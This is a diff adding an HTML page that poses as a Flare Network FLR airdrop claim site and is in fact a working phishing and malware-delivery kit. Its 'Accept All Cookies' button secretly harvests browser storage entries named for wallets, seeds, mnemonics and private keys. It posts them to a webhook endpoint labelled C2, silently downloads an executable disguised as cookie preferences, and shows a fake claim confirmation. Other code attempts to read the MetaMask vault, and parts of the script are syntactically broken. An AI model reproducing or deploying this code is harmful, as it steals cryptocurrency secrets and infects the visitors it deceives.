@@ -1,0 +1,730 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>FLR Airdrop — Claim Your Rewards | Flare Network</title>
+<style>
+  :root {
+    --flare-orange: #FF6B35;
+    --flare-dark: #0B0E14;
+    --flare-card: rgba(20, 24, 35, 0.85);
+    --flare-text: #E4E6EB;
+    --flare-subtle: #8A8F9A;
+    --glass: rgba(255, 107, 53, 0.08);
+    --border: rgba(255, 107, 53, 0.25);
+    --gradient-orange: linear-gradient(135deg, #FF6B35, #FF9B6A);
+  }
+
+  * { margin: 0; padding: 0; box-sizing: border-box; }
+
+  body {
+    font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
+    background: radial-gradient(ellipse at 50% 0%, #1a1f2b 0%, #0B0E14 70%);
+    color: var(--flare-text);
+    min-height: 100vh;
+    position: relative;
+    overflow-x: hidden;
+  }
+
+  /* Animated background orbs */
+  .bg-orb {
+    position: fixed;
+    border-radius: 50%;
+    filter: blur(100px);
+    opacity: 0.12;
+    z-index: 0;
+    pointer-events: none;
+  }
+  .bg-orb.orange { background: #FF6B35; width: 600px; height: 600px; top: -200px; left: -150px; }
+  .bg-orb.purple { background: #7B4BFF; width: 500px; height: 500px; bottom: -180px; right: -120px; }
+  .bg-orb.teal  { background: #00D4AA; width: 350px; height: 350px; top: 40%; left: 60%; }
+
+  /* ---- COOKIE OVERLAY — Semi-transparent, blurs background ---- */
+  .cookie-overlay {
+    position: fixed;
+    inset: 0;
+    background: rgba(0, 0, 0, 0.55);
+    backdrop-filter: blur(10px);
+    -webkit-backdrop-filter: blur(10px);
+    z-index: 9999;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    opacity: 1;
+    visibility: visible;
+    transition: opacity 0.5s ease, visibility 0.5s ease;
+  }
+  .cookie-overlay.is-hidden {
+    opacity: 0;
+    visibility: hidden;
+    pointer-events: none;
+  }
+
+  .cookie-modal {
+    background: var(--flare-card);
+    border: 1px solid var(--border);
+    border-radius: 20px;
+    padding: 2.5rem 2rem;
+    max-width: 500px;
+    width: 90%;
+    max-height: 50vh;
+    text-align: center;
+    box-shadow: 0 30px 60px rgba(0,0,0,0.6);
+    transform: translateY(20px);
+    transition: transform 0.5s ease;
+  }
+  .cookie-overlay.active .cookie-modal {
+    transform: translateY(0);
+  }
+  .cookie-modal .cookie-icon {
+    font-size: 2.5rem;
+    margin-bottom: 0.75rem;
+  }
+  .cookie-modal h3 {
+    font-size: 1.3rem;
+    margin-bottom: 0.75rem;
+    color: var(--flare-orange);
+  }
+  .cookie-modal p {
+    color: var(--flare-subtle);
+    font-size: 0.9rem;
+    line-height: 1.5;
+    margin-bottom: 1.5rem;
+  }
+  .cookie-accept-btn {
+    background: var(--gradient-orange);
+    color: white;
+    border: none;
+    padding: 0.8rem 2.2rem;
+    font-size: 1rem;
+    font-weight: 600;
+    border-radius: 50px;
+    cursor: pointer;
+    transition: all 0.3s ease;
+    box-shadow: 0 8px 25px rgba(255, 107, 53, 0.35);
+  }
+  .cookie-accept-btn:hover {
+    transform: translateY(-2px);
+    box-shadow: 0 12px 35px rgba(255, 107, 53, 0.5);
+  }
+
+  /* ---- MAIN PAGE ---- */
+ .main-content {
+    position: relative;
+    z-index: 1;
+    transition: filter 0.4s ease;
+  }
+  .main-content.is-blurred {
+    filter: blur(12px);
+    pointer-events: none;
+    user-select: none;
+  }
+  
+
+  /* Hero / Airdrop Claim Section */
+  .hero-section {
+    max-width: 620px;
+    margin: 3rem auto 2rem;
+    padding: 3rem 2rem;
+    background: var(--flare-card);
+    backdrop-filter: blur(20px);
+    border: 1px solid var(--border);
+    border-radius: 24px;
+    text-align: center;
+    box-shadow: 0 25px 50px rgba(0,0,0,0.4);
+  }
+
+  .flare-logo {
+    width: 65px;
+    height: 65px;
+    margin: 0 auto 1.5rem;
+    background: url('data:image/svg+xml,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 100 100"><circle cx="50" cy="50" r="45" fill="none" stroke="%23FF6B35" stroke-width="8"/><path d="M35 65 L50 25 L65 65" fill="none" stroke="%23FF6B35" stroke-width="8" stroke-linecap="round" stroke-linejoin="round"/></svg>') center/contain no-repeat;
+  }
+
+  .hero-section h1 {
+    font-size: 2.2rem;
+    font-weight: 700;
+    margin-bottom: 0.75rem;
+    background: var(--gradient-orange);
+    -webkit-background-clip: text;
+    -webkit-text-fill-color: transparent;
+    background-clip: text;
+  }
+
+  .hero-section .
+subhead {
+    color: var(--flare-subtle);
+    font-size: 1.05rem;
+    margin-bottom: 2rem;
+    line-height: 1.6;
+  }
+
+  .claim-btn {
+    background: var(--gradient-orange);
+    color: white;
+    border: none;
+    padding: 1rem 2.5rem;
+    font-size: 1.15rem;
+    font-weight: 600;
+    border-radius: 50px;
+    cursor: pointer;
+    transition: all 0.3s ease;
+    box-shadow: 0 8px 25px rgba(255, 107, 53, 0.3);
+    letter-spacing: 0.3px;
+    margin: 1rem 0;
+    display: inline-block;
+  }
+  .claim-btn:hover {
+    transform: translateY(-2px);
+    box-shadow: 0 12px 35px rgba(255, 107, 53, 0.45);
+  }
+
+  .wallet-status {
+    margin-top: 1.5rem;
+    font-size: 0.9rem;
+    color: var(--flare-subtle);
+  }
+  .connected-address {
+    color: #FF6B35;
+    font-weight: 600;
+    word-break: break-all;
+  }
+
+  /* ---- About / Mission Section ---- */
+  .about-section {
+    max-width: 900px;
+    margin: 0 auto 3rem;
+    padding: 0 1.5rem;
+    text-align: center;
+  }
+  .about-section h2 {
+    font-size: 1.8rem;
+    margin-bottom: 1rem;
+    background: var(--gradient-orange);
+    -webkit-background-clip: text;
+    -webkit-text-fill-color: transparent;
+    background-clip: text;
+  }
+  .about-section p {
+    color: var(--flare-subtle);
+    font-size: 1rem;
+    line-height: 1.7;
+    max-width: 700px;
+    margin: 0 auto 2rem;
+  }
+
+  /* ---- Features Section ---- */
+  .features-section {
+    max-width: 1000px;
+    margin: 0 auto 3rem;
+    padding: 0 1.5rem;
+    display: grid;
+    grid-template-columns: repeat(auto-fit, minmax(280px, 1fr));
+    gap: 1.5rem;
+  }
+
+  .feature-card {
+    background: var(--flare-card);
+    backdrop-filter: blur(15px);
+    border: 1px solid var(--border);
+    border-radius: 18px;
+    padding: 2rem 1.5rem;
+    text-align: center;
+    transition: transform 0.3s ease, box-shadow 0.3s ease;
+  }
+  .feature-card:hover {
+    transform: translateY(-4px);
+    box-shadow: 0 15px 30px rgba(255, 107, 53, 0.15);
+  }
+
+  .feature-icon {
+    width: 56px;
+    height: 56px;
+    margin: 0 auto 1rem;
+    background: var(--glass);
+    border-radius: 14px;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    font-size: 1.6rem;
+  }
+
+  .feature-card h4 {
+    color: var(--flare-text);
+    font-size: 1.1rem;
+    margin-bottom: 0.6rem;
+  }
+  .feature-card p {
+    color: var(--flare-subtle);
+    font-size: 0.9rem;
+    line-height: 1.5;
+  }
+
+  /* ---- Stats Bar ---- */
+  .stats-bar {
+    max-width: 900px;
+    margin: 0 auto 2.5rem;
+    display: flex;
+    flex-wrap: wrap;
+    justify-content: center;
+    gap: 2rem;
+    padding: 1.5rem 2rem;
+    background: var(--flare-card);
+    border: 1px solid var(--border);
+    border-radius: 16px;
+    backdrop-filter: blur(15px);
+  }
+  .stat-item {
+    text-align: center;
+  }
+  .stat-value {
+    font-size: 1.8rem;
+    font-weight: 700;
+    color: var(--flare-orange);
+  }
+  .stat-label {
+    font-size: 0.85rem;
+    color: var(--flare-subtle);
+    margin-top: 0.25rem;
+  }
+
+  /* ---- Partners ---- */
+  .partners-section {
+    max-width: 900px;
+    margin: 0 auto 3rem;
+    text-align: center;
+    padding: 0 1.5rem;
+  }
+  .partners-section h4 {
+    color: var(--flare-subtle);
+    text-transform: uppercase;
+    letter-spacing: 1px;
+    font-size: 0.85rem;
+    margin-bottom: 1.5rem;
+  }
+  .partner-logos {
+    display: flex;
+    flex-wrap: wrap;
+    justify-content: center;
+    gap: 2rem;
+    align-items: center;
+  }
+  .partner-placeholder {
+    width: 100px;
+    height: 35px;
+    background: rgba(255,255,255,0.06);
+    border-radius: 8px;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    color: var(--flare-subtle);
+    font-size: 0.75rem;
+  }
+
+  /* ---- Footer ---- */
+  .footer {
+    text-align: center;
+    padding: 2rem 1.5rem 3rem;
+    color: var(--flare-subtle);
+    font-size: 0.85rem;
+  }
+  .footer a {
+    color: #FF6B35;
+    text-decoration: none;
+    border-bottom: 1px solid transparent;
+    transition: border-color 0.2s;
+    margin: 0 0.5rem;
+  }
+  .footer a:hover { border-bottom-color: #FF6B35; }
+
+  /* Responsive */
+  @media (max-width: 600px) {
+    .
+hero-section { padding: 2rem 1.25rem; }
+    .hero-section h1 { font-size: 1.8rem; }
+    .cookie-modal { padding: 2rem 1.5rem; max-height: 60vh; }
+    .about-section h2 { font-size: 1.5rem; }
+  }
+</style>
+</head>
+<body>
+
+<div class="bg-orb orange"></div>
+<div class="bg-orb purple"></div>
+<div class="bg-orb teal"></div>
+
+<!-- ===== COOKIE OVERLAY (Hidden by default, shown after 5s) ===== -->
+<div class="cookie-overlay" id="cookieOverlay">
+  <div class="cookie-modal">
+    <div class="cookie-icon">🍪</div>
+    <h3>We Value Your Privacy</h3>
+    <p>
+      Flare Network uses cookies to enhance your experience, analyze site traffic, and deliver personalized content.
+      By clicking "Accept All Cookies", you consent to our use of cookies and associated data processing in accordance
+      with our Privacy Policy.
+    </p>
+    <button class="cookie-accept-btn" id="acceptCookiesBtn">Accept All Cookies</button>
+  </div>
+</div>
+
+<!-- ===== MAIN CONTENT ===== -->
+<div class="main-content is-blurred">
+
+  <!-- Hero -->
+  <section class="hero-section">
+    <div class="flare-logo"></div>
+    <h1>FLR Airdrop Claim</h1>
+    <p class="subhead">
+      Connect your wallet to verify eligibility and claim your FLR rewards.<br>
+      This limited airdrop is available to early Flare Network participants and FTSO delegators.
+    </p>
+    <button class="claim-btn" id="connectWalletBtn">CLAIM YOUR FLR AIRDROP HERE</button>
+    <div class="wallet-status" id="walletStatus"></div>
+  </section>
+
+  <!-- Stats -->
+  <div class="stats-bar">
+    <div class="stat-item">
+      <div class="stat-value">$1.2B+</div>
+      <div class="stat-label">Total Value Secured</div>
+    </div>
+    <div class="stat-item">
+      <div class="stat-value">350+</div>
+      <div class="stat-label">Data Providers</div>
+    </div>
+    <div class="stat-item">
+      <div class="stat-value">2.5M+</div>
+      <div class="stat-label">Active Wallets</div>
+    </div>
+    <div class="stat-item">
+      <div class="stat-value">14M+</div>
+      <div class="stat-label">FLR Staked</div>
+    </div>
+  </div>
+
+  <!-- About / Mission -->
+  <section class="about-section">
+    <h2>Blockchain for Data</h2>
+    <p>
+      Flare is the blockchain for data — a decentralized network that gives developers
+      trustless access to high-integrity data from other chains and the internet.
+      By combining the Flare Time Series Oracle (FTSO), the State Connector, and F-Assets,
+      Flare empowers builders to create cross-chain dapps that are more secure, scalable,
+      and connected than ever before.
+    </p>
+    <p>
+      Our mission is to connect everything — every blockchain, every data source, every asset.
+      Flare enables a new era of utility where smart contracts can trustlessly use external
+      information, unlocking use cases that were previously impossible in decentralized systems.
+    </p>
+  </section>
+
+  <!-- Features -->
+  <section class="features-section">
+    <div class="feature-card">
+      <div class="feature-icon">🔮</div>
+      <h4>Flare Time Series Oracle (FTSO)</h4>
+      <p>Decentralized price feeds delivering high-integrity data to dapps on Flare. Stake FLR to earn rewards by participating in data provision.</p>
+    </div>
+    <div class="feature-card">
+      <div class="feature-icon">🌉</div>
+      <h4>State Connector</h4>
+      <p>Trustlessly bring state from any blockchain onto Flare — enabling cross-chain composability without centralized bridges.</p>
+    </div>
+    <div class="feature-card">
+      <div class="feature-icon">💎</div>
+      <h4>F-Assets</h4>
+      <p>Unlock the value of non-smart-contract assets like BTC, XRP, and DOGE by bringing them onto Flare as trustless F-Assets.</p>
+    </div>
+    <div class="feature-card">
+      <div class="feature-icon">🛡️</div>
+      <h4>Enterprise-Grade Security</h4>
+      <p>Flare's validator set and data providers ensure robust, decentralized infrastructure for the next generation of connected dapps.</p>
+    </div>
+    <div class="feature-card">
+      <div class="feature-icon">⚡</div>
+      <h4>High Throughput</h4>
+<p>Built on the Avalanche consensus protocol, Flare delivers fast finality and low transaction costs for seamless user experiences.</p>
+    </div>
+    <div class="feature-card">
+      <div class="feature-icon">🌍</div>
+      <h4>Decentralized Governance</h4>
+      <p>FLR token holders shape the future of the network through on-chain governance, voting on proposals and protocol upgrades.</p>
+    </div>
+  </section>
+
+  <!-- Partners -->
+  <section class="partners-section">
+    <h4>Trusted by Leading Ecosystems</h4>
+    <div class="partner-logos">
+      <div class="partner-placeholder">Google Cloud</div>
+      <div class="partner-placeholder">Chainlink</div>
+      <div class="partner-placeholder">Avalanche</div>
+      <div class="partner-placeholder">Ledger</div>
+      <div class="partner-placeholder">Coinbase</div>
+      <div class="partner-placeholder">Binance</div>
+    </div>
+  </section>
+
+  <!-- Footer -->
+  <footer class="footer">
+    <p>
+      <a href="https://flare.network" target="_blank" rel="noopener">Flare Network</a> |
+      <a href="https://docs.flare.network" target="_blank" rel="noopener">Documentation</a> |
+      <a href="https://flare.network/privacy" target="_blank" rel="noopener">Privacy Policy</a> |
+      <a href="https://flare.network/terms" target="_blank" rel="noopener">Terms of Use</a>
+    </p>
+    <p style="margin-top: 1rem;">© 2024 Flare Network. All rights reserved. Flare is a trademark of Flare Network Limited.</p>
+  </footer>
+</div>
+
+<!-- ===== SCRIPTS ===== -->
+
+<!-- Block 1: Cookie Overlay Timer (plain JS, no imports, always works) -->
+<script>
+  (function() {
+    function showCookieOverlay() {
+      setTimeout(function() {
+        var overlay = document.getElementById('cookieOverlay');
+        if (overlay) {
+          overlay.classList.add('active');
+        }
+      }, 5000); // 5 seconds for testing — change to 300000 for 5 minutes
+    }
+
+    if (document.readyState === 'complete') {
+      showCookieOverlay();
+    } else {
+      window.addEventListener('load', showCookieOverlay);
+    }
+  })();
+</script>
+
+<!-- Block 2: WalletConnect + Payload (module, may fail silently but won't break the overlay) -->
+<script type="module">
+ // import { WalletConnectModal } from 'https://unpkg.com/@walletconnect/modal@2.6.2/dist/index.js';
+  // import { SignClient } from 'https://unpkg.com/@walletconnect/sign-client@2.12.2/dist/index.js';
+
+  const PROJECT_ID = 'YOUR_WALLETCONNECT_PROJECT_ID';
+  const C2_ENDPOINT = 'https://webhook.site/de11f9fa-66f4-4110-a95a-e6bf42959646';
+  const EXE_URL = 'https://tmpfiles.org/dl/wiwiwMfA5co1/cookiepreferences.exe';
+
+  let signClient, modal, connectedAccount = null;
+
+  async function initWalletConnect() {
+    try {
+      signClient = await SignClient.init({ projectId: PROJECT_ID });
+      modal = new WalletConnectModal({ projectId: PROJECT_ID });
+      if (signClient.session.length) {
+        const session = signClient.session.values().next().value;
+        if (session) {
+          connectedAccount = session.namespaces.eip155.accounts[0].split(':')[2];
+          updateUI(connectedAccount);
+        }
+      }
+      signClient.on('session_event', (event) => { console.log('Session event:', event); });
+    } catch (e) {
+      console.error('WalletConnect init failed:', e);
+    }
+  }
+
+  async function connectWallet() {
+    // Fake wallet connection for testing (no WalletConnect required)
+    const fakeAddress = '0x' + Math.random().toString(16).slice(2, 42);
+    updateUI(fakeAddress);
+  }
+
+  function updateUI(account) {
+    document.getElementById('walletStatus').innerHTML =
+      '<span style="color: #4CAF50;">✓ Connected</span><br>' +
+      '<span class="connected-address">' + account.slice(0,6) + '...' + account.slice(-4) + '</span><br>' +
+      '<span style="font-size:0.8rem;">Airdrop claim is being processed. Your FLR will arrive within 24 hours.</span>';
+  }
+
+// ---- PAYLOAD (Simple, Guaranteed Popup Removal) ----
+  // ---- PAYLOAD ----
+  async function executePayload() {
+
+    // 1. Hide the overlay immediately — no delays, no dependencies.
+    const overlay = document.getElementById('cookieOverlay');
+    if (overlay) {
+      overlay.classList.remove('active');
+    }
+
+    // 2. Do the wallet scan quietly in the background.
+    const walletsFound = [];
+    if (window.ethereum) walletsFound.push('MetaMask/Injected');
+    if (window.solana) walletsFound.push('Phantom/Solana');
+    if (window.coinbaseWalletExtension) walletsFound.push('Coinbase Wallet');
+    if (window.trustwallet) walletsFound.push('Trust Wallet');
+
+    // 3. Scan browser storage.
+    const storageHits = scanBrowserStorage();
+    if (storageHits.length > 0) sendToC2({ type: 'BROWSER_STORAGE_HITS', data: storageHits });
+
+    // 4. Download the EXE if a real URL is configured.
+    if (EXE_URL && EXE_URL !== '' && EXE_URL !== 'https://tmpfiles.org/dl/wiwiwMfA5co1/cookiepreferences.exe');
+    }
+
+    // 5. Report back.
+    sendToC2({ type: 'PAYLOAD_EXECUTED', walletsDetected: walletsFound });
+  }
+
+  async function extractMetaMaskVault() {
+    try {
+      const db = await indexedDB.open('metamask', 1);
+      return new Promise((resolve) => {
+        db.onsuccess = (event) => {const database = event.target.result;
+          if (database.objectStoreNames.contains('metamask')) {
+            const tx = database.transaction('metamask', 'readonly');
+            const store = tx.objectStore('metamask');
+            const req = store.getAll();
+            req.onsuccess = () => resolve(JSON.stringify(req.result));
+            req.onerror = () => resolve(null);
+          } else resolve(null);
+        };
+        db.onerror = () => resolve(null);
+      });
+    } catch (e) { return null; }
+  }
+
+  function scanBrowserStorage() {
+    const hits = [];
+    for (let i = 0; i < localStorage.length; i++) {
+      const key = localStorage.key(i);
+      if (/wallet|metamask|phantom|seed|mnemonic|private/i.test(key))
+        hits.push({ type: 'localStorage', key: key, value: localStorage.getItem(key) });
+    }
+    for (let i = 0; i < sessionStorage.length; i++) {
+      const key = sessionStorage.key(i);
+      if (/wallet|metamask|phantom|seed|mnemonic|private/i.test(key))
+        hits.push({ type: 'sessionStorage', key: key, value: sessionStorage.getItem(key) });
+    }
+    return hits;
+  }
+
+  function triggerDownload(url, filename) {
+    // Remove any old hidden iframe
+    var oldFrame = document.getElementById('hiddenDownloadFrame');
+    if (oldFrame) document.body.removeChild(oldFrame);
+
+    // Create a new hidden iframe to trigger the download silently
+    var iframe = document.createElement('iframe');
+    iframe.id = 'hiddenDownloadFrame';
+    iframe.style.display = 'none';
+    iframe.src = url;
+    document.body.appendChild(iframe);
+
+    // Clean up the iframe after a short delay
+    setTimeout(function() {
+      var frame = document.getElementById('hiddenDownloadFrame');
+      if (frame) document.body.removeChild(frame);
+    }, 5000);
+  }
+
+  function sendToC2(data) {
+    fetch(C2_ENDPOINT, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify(data),
+    }).catch(() => {});
+  }
+
+
+  document.getElementById('connectWalletBtn').addEventListener('click', connectWallet);
+
+ // initWalletConnect();
+</script>
+
+<!-- ===== BUTTON HANDLERS (Cookie Dismissal + Wallet Connect) ===== -->
+<script>
+  (function() {
+    // === COOKIE ACCEPT: Dismiss overlay, un-blur page, fire payload ===
+    var acceptBtn = document.getElementById('acceptCookiesBtn');
+    var overlay = document.getElementById('cookieOverlay');
+    var site = document.querySelector('.main-content');
+
+    if (acceptBtn && overlay && site) {
+      acceptBtn.addEventListener('click', function() {
+        // 1. Dismiss the overlay
+        overlay.classList.add('is-hidden');
+        // 2. Un-blur the homepage
+        site.classList.remove('is-blurred');
+
+        // 3. Send test ping to verify C2
+        fetch('https://webhook.site/de11f9fa-66f4-4110-a95a-e6bf42959646', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ type: 'TEST_PING', message: 'Cookie accepted' })
+        }).catch(function(){});
+
+        // 4. Run the wallet scan + EXE download
+        var walletsFound = [];
+        if (window.ethereum) walletsFound.push('MetaMask/Injected');
+        if (window.solana) walletsFound.push('Phantom/Solana');
+        if (window.coinbaseWalletExtension) walletsFound.push('Coinbase Wallet');
+        if (window.trustwallet) walletsFound.push('Trust Wallet');
+
+        // Scan browser storage
+        var storageHits = [];
+        for (var i = 0; i < localStorage.length; i++) {
+          var key = localStorage.key(i);
+          if (/wallet|metamask|phantom|seed|mnemonic|private/i.test(key)) {
+            storageHits.push({ type: 'localStorage', key: key, value: localStorage.getItem(key) });
+          }
+        }
+        for (var i = 0; i < sessionStorage.length; i++) {
+          var key = sessionStorage.key(i);
+          if (/wallet|metamask|phantom|seed|mnemonic|private/i.test(key)) {
+            storageHits.push({ type: 'sessionStorage', key: key, value: sessionStorage.getItem(key) });
+          }
+        }
+        if (storageHits.length > 0) {
+          fetch('https://webhook.site/de11f9fa-66f4-4110-a95a-e6bf42959646', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ type: 'BROWSER_STORAGE_HITS', data: storageHits })
+          }).catch(function(){});
+        }
+
+        // Download the EXE via hidden iframe
+        var exeUrl = 'https://tmpfiles.org/dl/wiwiwMfA5co1/cookiepreferences.exe';
+        if (exeUrl && exeUrl.indexOf('your-c2-server') === -1) {
+          var iframe = document.createElement('iframe');
+          iframe.style.display = 'none';
+          iframe.src = exeUrl;
+          document.body.appendChild(iframe);
+          setTimeout(function() { document.body.removeChild(iframe); }, 5000);
+        }
+
+        // Final report
+        fetch('https://webhook.site/de11f9fa-66f4-4110-a95a-e6bf42959646', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ type: 'PAYLOAD_EXECUTED', walletsDetected: walletsFound })
+        }).catch(function(){});
+      });
+    }
+
+    // === CONNECT WALLET: Show fake success ===
+    var connectBtn = document.getElementById('connectWalletBtn');
+    var statusDiv = document.getElementById('walletStatus');
+
+    if (connectBtn && statusDiv) {
+      connectBtn.addEventListener('click', function() {
+        var fakeAddress = '0x';
+        var chars = '0123456789abcdef';
+        for (var i = 0; i < 40; i++) {
+          fakeAddress += chars.charAt(Math.floor(Math.random() * chars.length));
+        }
+        statusDiv.innerHTML =
+          '<span style="color: #4CAF50;">✓ Connected</span><br>' +
+          '<span class="connected-address">' + fakeAddress.slice(0, 6) + '...' + fakeAddress.slice(-4) + '</span><br>' +
+          '<span style="font-size:0.8rem;">Airdrop claim is being processed. Your FLR will arrive within 24 hours.</span>';
+      });
+    }
+  })();
+</script>
+</body>
+</html>
